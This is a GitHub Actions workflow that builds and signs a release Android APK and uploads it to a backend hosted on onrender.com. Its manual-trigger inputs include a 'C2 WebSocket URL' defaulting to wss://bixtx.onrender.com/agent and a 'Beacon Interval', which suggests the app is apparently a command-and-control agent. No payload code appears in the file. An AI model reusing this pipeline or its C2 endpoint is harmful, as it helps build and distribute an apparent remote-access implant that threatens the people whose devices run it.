name: CI/CD Pipeline

on:
  workflow_dispatch:
    inputs:
      c2WsUrl:
        description: 'C2 WebSocket URL'
        required: false
        default: 'wss://bixtx.onrender.com/agent'
      beaconInterval:
        description: 'Beacon Interval (seconds)'
        required: false
        default: '30'
  push:
    branches:
      - main
    paths:
      - 'software-android/**'
      - '.github/workflows/build-android.yml'

jobs:
  android-build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up Java
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '17'
          cache: gradle

      - name: Setup Android SDK
        uses: android-actions/setup-android@v3
        with:
          packages: 'platform-tools build-tools;34.0.0 platforms;android-34'

      - name: Decode Android keystore
        run: |
          if [ -n "${{ secrets.ANDROID_KEYSTORE_BASE64 }}" ]; then
            echo "${{ secrets.ANDROID_KEYSTORE_BASE64 }}" | base64 --decode > software-android/keystore.jks
            cat > software-android/keystore.properties <<INNEREOF
          storePassword=${{ secrets.ANDROID_KEYSTORE_PASSWORD }}
          keyPassword=${{ secrets.ANDROID_KEY_PASSWORD }}
          keyAlias=${{ secrets.ANDROID_KEY_ALIAS }}
          storeFile=keystore.jks
          INNEREOF
          fi

      - name: Build release APK
        working-directory: software-android
        run: |
          chmod +x gradlew
          ./gradlew assembleRelease --no-daemon

      - name: Upload APK to backend
        if: success()
        run: |
          curl --fail-with-body -X POST \
            "${{ secrets.RENDER_APK_NOTIFY_URL }}/build/android/upload?secret=${{ secrets.RENDER_APK_NOTIFY_SECRET }}" \
            -H "Content-Type: application/octet-stream" \
            --data-binary @software-android/app/build/outputs/apk/release/app-release.apk
